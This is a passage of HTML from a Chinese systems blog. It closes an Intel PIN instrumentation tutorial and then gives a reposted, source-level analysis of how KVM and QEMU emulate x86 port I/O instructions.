class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Main                                                                      */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/*   argc, argv are the entire command line: pin -t      &lt;toolname&gt; -- ...    */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line">&#123;</div><div class="line">   <span class="comment">// Initialize pin</span></div><div class="line">   <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</div><div class="line"></div><div class="line">   OutFile.open(KnobOutputFile.Value().c_str());</div><div class="line"></div><div class="line">  <span class="comment">// Register Instruction to be called to instrument      instructions</span></div><div class="line">    INS_AddInstrumentFunction(Instruction, <span class="number">0</span>);</div><div class="line"></div><div class="line">   <span class="comment">// Register Fini to be called when the application      exits</span></div><div class="line">    PIN_AddFiniFunction(Fini, <span class="number">0</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Start the program, never returns</span></div><div class="line">    PIN_StartProgram();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.cs.virginia.edu/kim/docs/pldi05.pdf" target="_blank" rel="external">PLDI’2005</a></p>
<p><a href="https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/" target="_blank" rel="external">PIN User Manual</a></p>
<p><a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool" target="_blank" rel="external">PIN Intel Tutorials</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/二进制分析/">二进制分析</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Instrumentation/">Instrumentation</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PIN/">PIN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-kvmsource-io"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/kvmsource-io/">KVM源码分析之IO虚拟化之PIO</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/kvmsource-io/" class="article-date">
	  <time datetime="2017-01-04T05:52:09.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本KVM源码分析系列文章来自系Intel中国Linux内核与虚拟化开发工程师Oen Han的<a href="http://www.oenhan.com/kvm-src-5-io-pio" target="_blank" rel="external">博客</a>,Oen Han 在虚拟化领域有丰富的开发经验，其写的KVM源码分析系列是本人目前见过最好最详细的，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-io/" target="_blank" rel="external">KVM源码分析之IO虚拟化之PIO</a>》及原作者信息:<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 PIO指令介绍</li>
<li>0X02 PIO运行在KVM</li>
<li>0X03 PIO运行在QEMU</li>
</ul>
</blockquote>
<p>源代码:git tag, kernel v3.16.37 qemu v2.7 ，上一篇：KVM源代码分析4:内存虚拟化–OenHan</p>
<h3 id="0X01-PIO指令介绍"><a href="#0X01-PIO指令介绍" class="headerlink" title="0X01 PIO指令介绍"></a>0X01 PIO指令介绍</h3><p>80386的I/O指令使得处理器可以访问I/O端口，以便从外设输入数据，或者向外设发送数据。这些指令有一个指定I/O空间端口地址的操作数。有两类的I/O指令：</p>
<ul>
<li><p>1、 在寄存器指定的地址传送一个数据（字节、字、双字）。</p>
</li>
<li><p>2、 传送指定内存中的一串数据（字节串、字串、双字串）。这些被称作为“串 I/O指令”或者说“块I/O指令”。</p>
</li>
</ul>
<p>有IN/OUT INS/OUTS指令</p>
<h3 id="0X02-PIO运行在KVM"><a href="#0X02-PIO运行在KVM" class="headerlink" title="0X02 PIO运行在KVM"></a>0X02 PIO运行在KVM</h3><p>当guest执行PIO指令时，触发vmx_handle_exit，根据EXIT_REASON_IO_INSTRUCTION执行handle_io函数，根据sdm 3 27.5图表：</p>
<table>
<thead>
<tr>
<th>Bit Position(s) Contents</th>
<th>Contents</th>
</tr>
</thead>
<tbody>
<tr>
<td>2:0</td>
<td>Size of access：0 = 1-byte 1 = 2-byte 3 = 4-byte Other values not used</td>
</tr>
<tr>
<td>3</td>
<td>Direction of the attempted access (0 = OUT, 1 = IN)</td>
</tr>
<tr>
<td>4</td>
<td>String instruction (0 = not string; 1 = string)</td>
</tr>
<tr>
<td>5</td>
<td>REP prefixed (0 = not REP; 1 = REP)</td>
</tr>
<tr>
<td>6</td>
<td>Operand encoding (0 = DX, 1 = immediate)</td>
</tr>
<tr>
<td>15:7</td>
<td>Reserved (cleared to 0)</td>
</tr>
<tr>
<td>31:16</td>
<td>Port number (as specified in DX or in an immediate operand)</td>
</tr>
<tr>
<td>63:32</td>
<td>Reserved (cleared to 0). These bits exist only on processors that support Intel 64 architecture.</td>
</tr>
</tbody>
</table>
<p>在handle_io中，如果</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">string</span> = (exit_qualification &amp; <span class="number">16</span>) != <span class="number">0</span>;</div><div class="line"></div><div class="line">in = (exit_qualification &amp; <span class="number">8</span>) != <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// string串指令或者IO读的指令进行处理</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="built_in">string</span> || in)</div><div class="line"></div><div class="line"><span class="keyword">return</span> emulate_instruction(vcpu, <span class="number">0</span>) == EMULATE_DONE;</div><div class="line"></div><div class="line">port = exit_qualification &gt;&gt; <span class="number">16</span>;</div><div class="line"></div><div class="line">size = (exit_qualification &amp; <span class="number">7</span>) + <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">//跳过模拟指令，将非串写指令参数保存</span></div><div class="line"></div><div class="line">skip_emulated_instruction(vcpu);</div><div class="line"></div><div class="line"><span class="keyword">return</span> kvm_fast_pio_out(vcpu, size, port);</div></pre></td></tr></table></figure>
<p>先看kvm_fast_pio_out函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> val = kvm_register_read(vcpu, VCPU_REGS_RAX);</div><div class="line"></div><div class="line"><span class="keyword">int</span> ret = emulator_pio_out_emulated(&amp;vcpu-&gt;arch.emulate_ctxt,</div><div class="line"></div><div class="line">   size, port, &amp;val, <span class="number">1</span>);</div></pre></td></tr></table></figure>
<p>pio指令对象放在eax里面，在emulator_pio_out_emulated中</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="built_in">memcpy</span>(vcpu-&gt;arch.pio_data, val, size * count);    </div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.port = port;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.in = in;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.count  = count;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.size = size;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!kernel_pio(vcpu, vcpu-&gt;arch.pio_data)) &#123;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.count = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;exit_reason = KVM_EXIT_IO;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.direction = in ? KVM_EXIT_IO_IN : KVM_EXIT_IO_OUT;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.size = size;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.data_offset = KVM_PIO_PAGE_OFFSET * PAGE_SIZE;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.count = count;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.port = port;</div></pre></td></tr></table></figure>
<p>此处就将pio保存到vcpu-&gt;arch.pio中了，注意exit_reason赋值为KVM_EXIT_IO</p>
<p>麻烦点在x86_emulate_instruction函数，具体看</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> x86_emulate_ctxt &#123;</div><div class="line"></div><div class="line">        <span class="comment">/*操作对象*/</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">struct</span> x86_emulate_ops *ops;</div><div class="line"></div><div class="line"><span class="comment">/* Register state before/after emulation. */</span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eip;  <span class="comment">/* eip before instruction emulation */</span></div><div class="line"></div><div class="line"><span class="comment">/* Emulated execution mode, represented by an X86EMUL_MODE value. */</span></div><div class="line"></div><div class="line"><span class="keyword">enum</span> x86emul_mode mode;</div><div class="line"></div><div class="line"><span class="comment">/* interruptibility state, as a result of execution of STI or MOV SS */</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> interruptibility;</div><div class="line"></div><div class="line"><span class="keyword">int</span> emul_flags;</div><div class="line"></div><div class="line"><span class="keyword">bool</span> perm_ok; <span class="comment">/* do not check permissions if true */</span></div><div class="line"></div><div class="line"><span class="keyword">bool</span> ud;<span class="comment">/* inject an #UD if host doesn't support insn */</span></div><div class="line"></div><div class="line"><span class="keyword">bool</span> have_exception;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> x86_exception exception;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"></div><div class="line">* decode cache</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"><span class="comment">/* current opcode length in bytes */</span></div><div class="line"></div><div class="line">u8 opcode_len;</div><div class="line"></div><div class="line">u8 b;</div><div class="line"></div><div class="line">u8 intercept;</div><div class="line"></div><div class="line">u8 op_bytes;</div><div class="line"></div><div class="line">u8 ad_bytes;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand src;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand src2;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand dst;</div><div class="line"></div><div class="line"><span class="keyword">int</span> (*execute)(<span class="keyword">struct</span> x86_emulate_ctxt *ctxt);</div><div class="line"></div><div class="line"><span class="keyword">int</span> (*check_perm)(<span class="keyword">struct</span> x86_emulate_ctxt *ctxt);</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"></div><div class="line">* The following six fields are cleared together,</div><div class="line"></div><div class="line">* the rest are initialized unconditionally in x86_decode_insn</div><div class="line"></div><div class="line">* or elsewhere</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"><span class="keyword">bool</span> rip_relative;</div><div class="line"></div><div class="line">u8 rex_prefix;</div><div class="line"></div><div class="line">u8 lock_prefix;</div><div class="line"></div><div class="line">u8 rep_prefix;</div><div class="line"></div><div class="line"><span class="comment">/* bitmaps of registers in _regs[] that can be read */</span></div><div class="line"></div><div class="line">u32 regs_valid;</div><div class="line"></div><div class="line"><span class="comment">/* bitmaps of registers in _regs[] that have been written */</span></div><div class="line"></div><div class="line">u32 regs_dirty;</div><div class="line"></div><div class="line"><span class="comment">/* modrm */</span></div><div class="line"></div><div class="line">u8 modrm;</div><div class="line"></div><div class="line">u8 modrm_mod;</div><div class="line"></div><div class="line">u8 modrm_reg;</div><div class="line"></div><div class="line">u8 modrm_rm;</div><div class="line"></div><div class="line">u8 modrm_seg;</div><div class="line"></div><div class="line">u8 seg_override;</div><div class="line"></div><div class="line">u64 d;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _eip;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand memop;</div><div class="line"></div><div class="line"><span class="comment">/* Fields above regs are cleared together. */</span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _regs[NR_VCPU_REGS];</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand *memopp;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fetch_cache fetch;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> read_cache io_read;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> read_cache mem_read;</div><div class="line"></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">//init_emulate_ctxt负责初始化这个结构体，</span></div><div class="line"></div><div class="line">ctxt-&gt;fetch.ptr = ctxt-&gt;fetch.data;</div><div class="line">ctxt-&gt;fetch.end = ctxt-&gt;fetch.data + insn_len;</div><div class="line"><span class="keyword">if</span> (insn_len &gt; <span class="number">0</span>)</div><div class="line">         <span class="comment">/*所有指令内容存放在data中*/</span></div><div class="line"><span class="built_in">memcpy</span>(ctxt-&gt;fetch.data, insn, insn_len);</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">/*如果没有指定指令的内容，就从当前eip读取一个指令*/</span></div><div class="line">rc = __do_insn_fetch_bytes(ctxt, <span class="number">1</span>);</div><div class="line"><span class="keyword">if</span> (rc != X86EMUL_CONTINUE)</div><div class="line"><span class="keyword">return</span> rc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>都是将指令读取出来放到ctxt-&gt;fetch.data中而已，没有执行。</p>
<p>看__do_insn_fetch_bytes函数，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> cur_size = ctxt-&gt;fetch.end - ctxt-&gt;fetch.data;</div><div class="line"></div><div class="line"><span class="comment">/*下面的ea事实上应该说是指令decode时真正的eip，因为指令还没有被执行，eip没有</span></div><div class="line"></div><div class="line"> * 更新，所以每次decode计算eip都要加上已经decode的代码长度，就是cur_size */</div><div class="line"></div><div class="line"><span class="keyword">struct</span> segmented_address addr = &#123; .seg = VCPU_SREG_CS,</div><div class="line">  .ea = ctxt-&gt;eip + cur_size &#125;;</div><div class="line"></div><div class="line"><span class="comment">/*__linearize就是获取线性地址*/</span></div><div class="line"> la = seg_base(ctxt, addr.seg) + addr.ea;</div></pre></td></tr></table></figure>
<p>后面的即是一些处理，如不满足权限的就要模拟gp错误，emulate_gp。</p>
<p>然后是:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rc = ctxt-&gt;ops-&gt;fetch(ctxt, linear, ctxt-&gt;fetch.end, size, &amp;ctxt-&gt;exception);</div></pre></td></tr></table></figure>
<p>即kvm_fetch_guest_virt</p>
<p>先通过vcpu-&gt;arch.walk_mmu-&gt;gva_to_gpa获取gpa的值，然后用kvm_vcpu_read_guest_page获取gpa对应的内存值，这两个函数不再展开。</p>
<p>最终效果就是将linear对应的mem中大小为size的内容写入到ctxt-&gt;fetch.end指针对应的缓存中，因为ctxt-&gt;fetch.end = ctxt-&gt;fetch.data + insn_len而insn_len为0，则写入的是ctxt-&gt;fetch.data，在x86_decode_insn中，__do_insn_fetch_bytes就是从eip中copy了一个指令的内容到ctxt-&gt;fetch.data。x86_emulate_insn后面是指令解释的跳过。</p>
<p>x86_emulate_instruction后面一段代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*exception在decode中产生*/</span></div><div class="line"><span class="keyword">if</span> (ctxt-&gt;have_exception) &#123;</div><div class="line">r = EMULATE_DONE;</div><div class="line"><span class="keyword">if</span> (inject_emulated_exception(vcpu))</div><div class="line"><span class="keyword">return</span> r;</div><div class="line"><span class="comment">/*decode会处理，pio的执行次数，针对串指令*/</span></div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (vcpu-&gt;arch.pio.count) &#123;</div><div class="line"><span class="comment">/*写入io的不特殊处理，只需完成写入即可*/</span></div><div class="line"><span class="keyword">if</span> (!vcpu-&gt;arch.pio.in) &#123;</div><div class="line"><span class="comment">/* <span class="doctag">FIXME:</span> return into emulator if single-stepping.  */</span></div><div class="line">vcpu-&gt;arch.pio.count = <span class="number">0</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">writeback = <span class="literal">false</span>;</div><div class="line"><span class="comment">/*读取io的则需要回头处理读的值的流程*/</span></div><div class="line">vcpu-&gt;arch.complete_userspace_io = complete_emulated_pio;</div><div class="line">&#125;</div><div class="line">r = EMULATE_USER_EXIT;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (vcpu-&gt;mmio_needed) &#123;</div><div class="line"><span class="comment">/*同上*/</span></div><div class="line"><span class="keyword">if</span> (!vcpu-&gt;mmio_is_write)</div><div class="line">writeback = <span class="literal">false</span>;</div><div class="line">r= EMULATE_USER_EXIT;</div><div class="line">vcpu-&gt;arch.complete_userspace_io = complete_emulated_mmio;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (r == EMULATION_RESTART)</div><div class="line"><span class="keyword">goto</span> restart;</div><div class="line"><span class="keyword">else</span></div><div class="line">r = EMULATE_DONE;</div></pre></td></tr></table></figure>
<p>handle_io 返回return emulate_instruction(vcpu, 0) == EMULATE_DONE，即是kvm_x86_ops-&gt;handle_exit(vcpu)的返回值，返回值不大于0，则从vcpu_run循环中跳出到qemu mode。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (kvm_vcpu_running(vcpu)) &#123;</div><div class="line">r = vcpu_enter_guest(vcpu);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">r = vcpu_block(kvm, vcpu);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (r &lt;= <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<h3 id="0X03-PIO运行在QEMU"><a href="#0X03-PIO运行在QEMU" class="headerlink" title="0X03 PIO运行在QEMU"></a>0X03 PIO运行在QEMU</h3><p>在qemu kvm_cpu_exec函数中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</div><div class="line"><span class="comment">/*KVM_EXIT_IO是在emulator_pio_in_out标记的*/</span></div><div class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</div><div class="line">            DPRINTF(<span class="string">"handle_io\n"</span>);</div><div class="line">            <span class="comment">/* Called outside BQL */</span></div><div class="line">            kvm_handle_io(run-&gt;io.port, attrs,</div><div class="line">                          (<span class="keyword">uint8_t</span> *)run + run-&gt;io.data_offset,</div><div class="line">                         run-&gt;io.direction,</div><div class="line">                          run-&gt;io.size,</div><div class="line">                          run-&gt;io.count);</div><div class="line">            ret = <span class="number">0</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> KVM_EXIT_MMIO:</div><div class="line">            DPRINTF(<span class="string">"handle_mmio\n"</span>);</div><div class="line">            <span class="comment">/* Called outside BQL */</span></div><div class="line">            address_space_rw(&amp;address_space_memory,</div><div class="line">                             run-&gt;mmio.phys_addr, attrs,</div><div class="line">                             run-&gt;mmio.data,</div><div class="line">                             run-&gt;mmio.len,</div><div class="line">                             run-&gt;mmio.is_write);</div><div class="line">            ret = <span class="number">0</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kvm_handle_io</span><span class="params">(<span class="keyword">uint16_t</span> port, MemTxAttrs attrs, <span class="keyword">void</span> *data, <span class="keyword">int</span> direction,</span></span></div><div class="line"></div><div class="line">                          <span class="keyword">int</span> size, <span class="keyword">uint32_t</span> count)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">uint8_t</span> *ptr = data;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</div><div class="line">        <span class="comment">/*从qemu内存中读写数据，本质就成了mmio操作 */</span></div><div class="line">        address_space_rw(&amp;address_space_io, port, attrs, ptr, size, direction == KVM_EXIT_IO_OUT);</div><div class="line">        ptr += size;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果写IO此处就算完成了，如果读取IO，此时读取完成，还需要后面处理。</p>
<p>处理在kvm_arch_vcpu_ioctl_run中的vcpu_run之前，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (unlikely(vcpu-&gt;arch.complete_userspace_io)) &#123;</div><div class="line"><span class="keyword">int</span> (*cui)(<span class="keyword">struct</span> kvm_vcpu *) = vcpu-&gt;arch.complete_userspace_io;</div><div class="line">vcpu-&gt;arch.complete_userspace_io = <span class="literal">NULL</span>;</div><div class="line">r = cui(vcpu);</div><div class="line"><span class="keyword">if</span> (r &lt;= <span class="number">0</span>)</div><div class="line"><span class="keyword">goto</span> out;</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line">WARN_ON(vcpu-&gt;arch.pio.count || vcpu-&gt;mmio_needed);</div></pre></td></tr></table></figure>
<p>本质执行了complete_userspace_io函数，即是complete_emulated_pio。</p>
<p>就是r = emulate_instruction(vcpu, EMULTYPE_NO_DECODE)，再次模拟IO指令，此时将数据读取到模拟的IO端口上，模拟完成即可。</p>
<p>—结束—</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-io/" target="_blank" rel="external">KVM源码分析之IO虚拟化之PIO</a>》及原作者信息:<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟化原理/">虚拟化原理</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-kvmsource-memory"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/kvmsource-memory/">KVM源码分析之内存虚拟化</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/kvmsource-memory/" class="article-date">
	  <time datetime="2017-01-04T05:50:55.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
<hr>
